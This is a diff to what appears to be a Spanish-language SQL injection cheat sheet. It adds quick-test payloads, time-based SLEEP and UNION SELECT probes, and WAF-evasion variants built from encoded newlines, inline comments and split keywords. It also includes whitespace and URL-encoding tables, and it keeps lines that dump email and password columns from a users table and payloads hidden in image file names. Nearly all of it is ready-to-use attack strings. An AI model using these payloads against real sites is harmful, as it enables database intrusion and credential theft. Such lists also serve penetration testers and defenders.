@@ -5,6 +5,10 @@
 ```bash
 # Testing rapido. El 1 representa el numero o letra despues del parametro.
 ' " ) # || + >
+1||!{f'id'}union -- a%0Aselect@1,2,3 --
+ELT((1=1),1,2)
+1-IF(1=1,0,1)
+1-IF(1=2,0,1)
 1'
 1"
 1\
@@ -16,8 +20,9 @@
 1' AND 1=2#
 1' AND SLEEP(3)#
 1' UNION SELECT 1#
-1' ORDER BY 1#
-1'OR(1)=1# 
+1'OR(1)=1#
+1+OR+0x50=0x50
+1+and+5!=6
 1'||1=1#
 1'AND(SLEEP(5))#
 SLEEP(5)--
@@ -35,6 +40,15 @@ SELECT SLEEP(25)--
 1" OR "1"="1" --
 1' OR LENGTH(USER()) > 18 -- -
 1' OR 1=1 ORDER BY (SELECT IF(1=1, SLEEP(5), 0) FROM (SELECT 1) AS x LIMIT 1) -- -
+```
+**`⃤⃞⃟⃤`** Cuando el servidor corta la comunicación.
+```bash
+# "The connection was reset"
+.1union-- a%0Aselect 1,2,3
+1-.1union- a%0Aselect- 1,2,3
+1'e0union- a%0Aselect 1,2,3
+\Nunion- a%0Aselect 1,2,3
+1 *9e0union-- -a%0Aselect 1,2,3
 ```
 **`⃤⃞⃟⃤`** Version.
 ```bash
@@ -169,6 +183,38 @@ SELECT SLEEP(25)--
 -1%0Aunion%0AALL%0Aselect%0Anull%2C(select%0Agroup_concat(concat_WS(0x3a%2Cemail%2Cpass)%0ASEPARATor%0A0x7c)%0Afrom%0Ausers)%2Cnull%2Cnull%23
 -1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(CONC/**/AT_WS(0x3a,email,pass)/**/SEPARATOR/**/0x7c)/**/FR/**/OM/**/users),NULL,NULL#
 ```
+**`⃤⃞⃟⃤`** Waf comments, whitespace y url encode.
+```bash
+# Cometarios.
+/*!00000*/
+/*x*/
+/**x**/
+/*%26*/
+/%2A%2A/
+%2f**%2f
+-------------------------------------------------------------------------------
+# Espacios en blanco.
+%0a
+%0b
+%0d
+%C0
+%20
+%09
+%0c
+%a0
+---------------------------------------------------------------------------------
+# Codificacion en url.
+! = %21
+" = %22
+# = %23
+$ = %24
+% = %25
+& = %26
+' = %27
+( = %28
+) = %29
+* = %2A
+```
 **`⃤⃞⃟⃤`** Payloads en nombre de imagen.
 ```bash
 imagen.jpg' AND (SELECT 1 FROM (SELECT(SLEEP(10)))x) -- -.jpg
@@ -195,4 +241,3 @@ https://www.slideshare.net/slideshow/advanced-sql-injection-eng/2532493
 
 https://www.slideshare.net/slideshow/sql-injection-bypassing-hand-book-blackrose/53458597
 
-https://www.slideshare.net/slideshow/new-techniques-in-sql-obfuscation/13595463
